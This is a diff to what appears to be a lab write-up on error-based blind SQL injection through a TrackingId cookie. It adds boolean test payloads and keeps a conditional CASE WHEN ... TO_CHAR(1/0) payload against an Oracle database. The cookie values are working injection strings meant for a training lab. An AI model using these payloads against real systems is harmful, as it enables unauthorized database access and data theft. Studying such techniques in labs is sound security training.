@@ -189,7 +189,17 @@ We will perform injection based on the session cookie (internal server error: po
 Cookie: TrackingId=XZqKxHXKgUbxQYVh
 ```
 
-If (1=0) --> FALSE so will result no error (we will loose track of injection)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=1--NO ERROR or Message
+```
+
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=0--NO ERROR or Message
+```
+
+So we will use a different conditional approach:
+
+If (1=0) --> FALSE so will result no error because of ELSE 'a' (we will loose track of injection)
 ```
 Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
 ```
